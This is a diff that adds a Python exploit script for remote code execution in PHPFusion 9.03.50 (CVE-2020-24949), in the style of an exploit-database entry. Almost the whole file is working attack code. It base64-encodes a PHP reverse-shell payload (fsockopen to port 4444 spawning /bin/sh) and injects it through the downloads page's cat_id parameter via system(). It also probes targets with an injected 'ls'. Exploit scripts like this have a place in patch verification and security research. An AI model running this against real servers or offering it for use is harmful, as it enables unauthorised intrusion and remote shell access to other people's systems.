@@ -1,0 +1,50 @@
+# Exploit Title: PHPFusion 9.03.50 - Remote Code Execution
+# Date: 20/05/2021
+# Exploit Author: g0ldm45k
+# Vendor Homepage: https://www.php-fusion.co.uk/home.php
+# Software Link: https://www.php-fusion.co.uk/infusions/downloads/downloads.php?cat_id=30&download_id=606
+# Version: 9.03.50
+# Tested on: Docker + Debian GNU/Linux 8 (jessie)
+# CVE : CVE-2020-24949
+# Found by: ThienNV
+
+import requests
+import base64
+import argparse
+
+
+PAYLOAD = "php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&4 >&4 2>&4\");'  " # !!spaces are important in order to avoid ==!!
+REQUEST_PAYLOAD = "/infusions/downloads/downloads.php?cat_id=$\{{system(base64_decode({})).exit\}}"
+
+
+parser = argparse.ArgumentParser(description='Send a payload to a Fusion 9.03.50 server with "Allow PHP Execution" enabled.')
+parser.add_argument('target', type=str, help='Turn the Allow PHP Execution verification step on or off.')
+parser.add_argument("-v", "--no-verify", action="store_false")
+
+args = parser.parse_args()
+
+if args.target.startswith("http://") or args.target.startswith("https://"):
+    target = args.target
+else:
+    print("[!] Target should start with either http:// or https://")
+    exit()
+
+# verify payload
+PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode('ascii')).decode("ascii")
+if '+' in PAYLOAD_B64 or '=' in PAYLOAD_B64:
+    print("[!] Invalid payload, make sure it does not contain a + or a =!")
+    exit()
+
+# verify vulnerable host
+if args.no_verify:
+    page_data = requests.get(target + "/infusions/downloads/downloads.php?cat_id=${system(ls)}")
+    if "infusion_db.php" not in page_data.text:
+        print("[!] Can't seem to find infusion_db.php. QUITTING!")
+        print("[!] If this validation is wrong just use the --no-verify flag.")
+        exit()
+
+
+# send request
+requests.get(target + REQUEST_PAYLOAD.format(PAYLOAD_B64))
+
+print("[*] Requests send, did you get what you wanted?")
